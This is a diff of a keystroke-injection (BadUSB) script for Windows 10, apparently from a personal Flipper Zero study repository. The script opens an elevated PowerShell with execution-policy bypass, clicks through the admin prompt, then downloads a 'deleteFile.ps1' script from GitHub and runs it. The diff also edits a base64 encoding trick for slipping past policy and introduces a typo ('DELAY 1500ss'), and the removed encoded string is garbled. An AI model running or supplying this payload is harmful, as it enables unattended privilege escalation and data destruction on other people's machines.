@@ -6,23 +6,24 @@ REM Meant for Windows 10
 REM Running Powershell as an Admin
 GUI r
 DELAY 200
-STRING powershell -ExecutionPolicy Bypass -Command "Start-Process powershell -Verb RunAs"
+STRING powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass' -Verb RunAs"
 ENTER
-DELAY 1500
+DELAY 1000
 SHIFT TAB
 DELAY 500
 ENTER
-DELAY 1500
+DELAY 1500ss
 STRING cd C:\
 ENTER
 
 REM If ExecutionPolicy Bypass does not work, you can use the base64 encoded version of the command.
-REM powershell.exe -EncodedCommand "RwBlcnNvbmFkZVBvbGljeSBCYXNlIHN5c3RlbSB7IFN0YXJ0LXByb2Nlc3MgcG93ZXJtaW5nIFwibmFtZSIsIFwibW92ZSB3aXRob3V0IHJlc2VhcmNoIGVtb3Rpb25zIiwgXCJtYXN0ZXIiLCAicmVhZEFzIGJ5IHRoZSBzZWNyZXR9IHwgU3RhcnQtUHJvY2Vzc3MgcG93ZXJtaW5nLmV4ZT0gIkJheXBhbGVkLVBvd2VybWluZy4lMjIi"
+REM $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("powershell -NoProfile -ExecutionPolicy Bypass -Command `"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass' -Verb RunAs`""))
+REM powershell.exe -EncodedCommand $encodedCommand
 
 REM Downloading the deleteFile.ps1 from GitHub and running it
 STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/aenslei/flipperZero-studies/raw/main/Powershell/deleteFile.ps1', 'C:\deleteFile.ps1')
 ENTER
-DELAY 5000
+DELAY 1000
 STRING .\deleteFile.ps1
 ENTER
 
